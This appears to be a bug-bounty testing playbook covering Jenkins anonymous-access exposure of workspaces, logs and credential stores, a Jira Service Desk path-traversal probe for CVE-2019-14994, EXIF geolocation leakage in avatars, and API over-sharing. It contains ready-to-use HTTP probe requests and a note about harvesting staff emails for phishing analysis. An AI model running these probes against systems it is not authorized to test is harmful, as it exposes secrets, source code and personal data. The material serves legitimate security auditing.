# CI/CD, DevOps Exposure & Information Disclosure Playbook

This reference playbook provides actionable auditing and reproduction instructions for continuous integration/deployment (CI/CD) misconfigurations (specifically Jenkins and Jira), EXIF metadata disclosure, and API data over-sharing based on field bug bounty findings.

---

## 1. Vulnerability 1: Jenkins CI/CD Unauthenticated Workspace & Credential Exposure

### Conceptual Overview
Jenkins instances deployed for automated software testing often suffer from permissive default security settings where anonymous users have `Overall/Read` permissions. This allows unauthenticated external visitors to browse internal build logs, download proprietary source repositories, extract environment keys, and access credential identifiers.

### Target Endpoints Checklist
- `/jenkins/job/{JobName}/ws/` — Direct access to the live build workspace files.
- `/jenkins/job/{JobName}/lastSuccessfulBuild/consoleText` — Plaintext execution logs containing passwords, tokens, and debug data.
- `/jenkins/credentials/` & `/jenkins/credentials/store/system/domain/_/` — Credential domain stores and secret identifiers.
- `/jenkins/asynchPeople/` — Complete directory of all developers, committers, and user accounts.
- `/jenkins/user/{username}/` — User profile details and public SSH keys.
- `/jenkins/api/json?pretty=true` — Complete JSON dump of all configured jobs and build statuses.

### Step-by-Step Reproduction Instructions

#### Execution Steps
1. **Identify Exposed Jenkins Instance:**
   - Fingerprint Jenkins via HTTP headers (`X-Jenkins: 2.x`, `X-Hudson: 1.395`) or the favicon.
2. **Probe Workspace Directory Browsing:**
   - Fetch the root jobs listing:
     ```http
     GET /jenkins/api/json HTTP/1.1
     Host: target-ci.com
     ```
   - Extract active job names from the JSON array.
   - Navigate to the workspace URL of a target job:
     ```http
     GET /jenkins/job/BackendCatalogService/ws/ HTTP/1.1
     ```
   - **Expected Vulnerable Response:** An HTML directory index displaying internal source code files (`.env`, `package.json`, `settings.py`, database migration scripts).
3. **Audit Credentials Store:**
   - Attempt access to the credentials endpoint:
     ```http
     GET /jenkins/credentials/store/system/domain/_/ HTTP/1.1
     ```
   - Check if credential descriptions, IDs, and domain mappings (e.g. AWS role tokens, GitLab deploy keys) are enumerated.
4. **Enumerate Organizational Users:**
   - Request the user directory:
     ```http
     GET /jenkins/asynchPeople/ HTTP/1.1
     ```
   - Note corporate email addresses and usernames for spear-phishing or credential stuffing analysis.

---

## 2. Vulnerability 2: Atlassian Jira Service Desk Authorization Bypass (CVE-2019-14994)

### Conceptual Overview
In Jira Service Desk Server and Data Center versions prior to 3.9.16, 4.1.3, and 4.2.5, path traversal vulnerabilities in the customer portal login and signup handlers allow unauthenticated remote attackers with portal access to browse and view arbitrary internal project issues.

### Vulnerability Verification Steps
1. **Locate Jira Customer Portal:**
   - Endpoints:
     - `/servicedesk/customer/user/login`
     - `/servicedesk/customer/portal/{portalId}/user/signup`
2. **Execute Path Traversal Probe:**
   - Craft a request traversing outside the customer portal context into the core Jira issue viewer:
     ```http
     GET /servicedesk/customer/user/login/../../issues/?jql= HTTP/1.1
     Host: jira.target.com
     ```
   - Or test ticket direct access via traversal:
     ```http
     GET /servicedesk/customer/user/login/../../browse/PROJ-1 HTTP/1.1
     ```
3. **Verify Vulnerability:**
   - If the response renders internal ticket summaries, internal comments, or the issue search grid, CVE-2019-14994 is present.

---

## 3. Vulnerability 3: Avatar & Image Upload EXIF Metadata Disclosure

### Conceptual Overview
When users upload photos or avatars, smartphones and digital cameras embed Exchangeable Image File Format (EXIF) metadata. This metadata can include precise GPS latitude/longitude coordinates, altitude, device camera serial numbers, and personal timestamps. If the application resizes or stores the original image without stripping EXIF tags, an attacker can harvest sensitive geographical location data of users.

### Step-by-Step Reproduction Instructions

#### Execution Steps
1. **Prepare a Test Image with Geolocation EXIF:**
   - Use an authentic photo taken with a smartphone (with location services enabled) or embed GPS coordinates using `exiftool`:
     ```bash
     exiftool -GPSLatitude=37.7749 -GPSLatitudeRef=N -GPSLongitude=122.4194 -GPSLongitudeRef=W test_avatar.jpg
     ```
2. **Upload Avatar via Target Application:**
   - In your test profile, upload `test_avatar.jpg`.
3. **Retrieve the Publicly Rendered Image:**
   - View the profile page from an incognito session or second browser.
   - Right-click the displayed avatar -> **Copy Image Address** (or **Open Image in New Tab**).
   - Download the image:
     ```bash
     curl -s -O https://target.com/static/avatars/user_1029.jpg
     ```
4. **Extract Metadata:**
   - Run `exiftool` on the downloaded image:
     ```bash
     exiftool user_1029.jpg | grep -i -E "GPS|Camera|Model|Date"
     ```
   - Alternatively, inspect via online EXIF viewers (`exif.regex.info`).
5. **Evaluate Impact:**
   - If `GPS Latitude`, `GPS Longitude`, or `Camera Serial Number` are returned, information disclosure is confirmed.

---

## 4. Vulnerability 4: Profile API Data Over-Sharing

### Conceptual Overview
Single-Page Applications frequently call profile API endpoints (`GET /api/v1/users/{id}`) that return extensive internal database models in JSON format. The frontend UI might only display the user's name and bio, hiding internal fields with CSS or template logic, while the underlying HTTP response leaks:
- Plaintext phone numbers or email addresses
- Internal role flags (`isAdmin: false`, `isModerator: false`)
- Social security / national ID fragments
- Internal account creation IPs and session timestamps

### Verification Steps
- Intercept all `GET /api/v1/profile` or `GET /api/v1/users/{userId}` calls in Burp Suite.
- Compare the JSON response payload against what is visually displayed on the user's screen.
- Verify whether visiting another user's public profile returns their private contact details or internal security state flags.
